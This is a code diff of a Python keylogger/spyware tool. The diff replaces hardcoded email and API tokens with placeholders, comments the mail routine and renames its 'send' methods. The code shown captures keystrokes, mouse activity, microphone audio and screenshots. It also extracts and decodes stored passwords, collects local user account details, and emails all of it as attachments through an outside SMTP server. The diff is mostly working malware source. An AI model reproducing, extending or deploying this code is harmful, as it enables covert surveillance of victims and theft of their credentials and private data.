@@ -64,9 +64,9 @@ finally:
 
     atexit.register(cleanup_temp_dir)
 
-    EMAIL_ADDRESS = "a36f2db379fade"
-    EMAIL_PASSWORD = "e79b8e24d4c8c9"
-    IP_INFO_TOKEN = "052c054ec65ee7"
+    EMAIL_ADDRESS = "YOUR_EMAIL_ADDRESS_HERE"
+    EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD_HERE"
+    IP_INFO_TOKEN = "YOUR_IP_INFO_TOKEN_HERE"
     SEND_REPORT_EVERY = 10
 
     class KeyLogger:
@@ -113,30 +113,30 @@ finally:
                     else:
                         self.appendlog(str(key))
 
-        def send_mail(self, message_subject, message_body, attachment_paths=None):
+        def send_mail(self, message_subject, message_body, attachment_paths = None):
             sender = self.email
             receiver = self.email
 
-            msg = MIMEMultipart()
+            msg = MIMEMultipart() # Creates an instance of 'MIMEMultipart', a class for creating MIME objects.
             msg['From'] = sender
             msg['To'] = receiver
             msg['Subject'] = message_subject
 
             body = message_body
-            msg.attach(MIMEText(body, 'plain'))
+            msg.attach(MIMEText(body, 'plain')) # Attaches the plain text body to the email message.
 
             if attachment_paths:
                 for attachment_path in attachment_paths:
-                    attachment = MIMEBase('application', 'octet-stream')
+                    attachment = MIMEBase('application', 'octet-stream') # Creates a MIMEBase object for handling binary data attachments.
                     with open(attachment_path, 'rb') as attachment_file:
-                        attachment.set_payload(attachment_file.read())
+                        attachment.set_payload(attachment_file.read()) # Reads the content of the attachment file and sets it as the payload of the MIMEBase object.
                     encoders.encode_base64(attachment)
-                    attachment.add_header('Content-Disposition', f'attachment; filename={os.path.basename(attachment_path)}')
+                    attachment.add_header('Content-Disposition', f'attachment; filename={os.path.basename(attachment_path)}') # Adds a header to the attachment specifying its disposition and filename.
                     msg.attach(attachment)
 
-            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
-                server.login(self.email, self.password)
-                server.sendmail(sender, receiver, msg.as_string())
+            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server: # Establishes a connection to the SMTP server using the provided host ('smtp.mailtrap.io') and port (2525).
+                server.login(self.email, self.password) # Logs in to the SMTP server using the provided email and password.
+                server.sendmail(sender, receiver, msg.as_string()) # Sends the email message using the 'sendmail' method, providing sender, receiver, and the formatted email message.
 
         def microphone(self):
             fs = 44100  # Represents the sampling frequency (in Hz) for the audio recording.
@@ -307,7 +307,7 @@ finally:
             except Exception:
                 return "Error decoding password"
 
-        def get_and_send_credentials(self):
+        def send_credentials(self):
             try:
                 credentials = self.get_credentials()
 
@@ -361,7 +361,7 @@ finally:
 
             return user_info_list
 
-        def print_user_info(self, user_info):
+        def send_user_info(self, user_info):
             user_info_str = f"Username: {user_info['Username']}\n" \
                             f"  Name: {user_info['Name']}\n" \
                             f"  FullName: {user_info['FullName']}\n" \
@@ -380,7 +380,7 @@ finally:
                             f"\n\n"
             self.appendlog(user_info_str)
 
-        def get_and_send_local_users_info(self):
+        def send_local_users_info(self):
 
             local_users_info = self.get_local_users_info()
 
@@ -393,7 +393,7 @@ finally:
                     self.appendlog(f"-   {username.Name}\n")
                 self.appendlog('\n')
                 for user_info in local_users_info:
-                    self.print_user_info(user_info)
+                    self.send_user_info(user_info)
             else:
                 self.appendlog("No local user accounts found.\n")
 
@@ -430,8 +430,8 @@ finally:
         def run(self):
             microphone_thread = threading.Thread(target = self.microphone)
             screenshot_thread = threading.Thread(target = self.screenshot)
-            credentials_thread = threading.Thread(target = self.get_and_send_credentials)
-            local_users_thread = threading.Thread(target = self.get_and_send_local_users_info)
+            credentials_thread = threading.Thread(target = self.send_credentials)
+            local_users_thread = threading.Thread(target = self.send_local_users_info)
 
             mouse_listener = mouse.Listener(on_move = self.onMove, on_click = self.onClick, on_scroll = self.onScroll)
             keyboard_listener = keyboard.Listener(on_press = self.onPress)
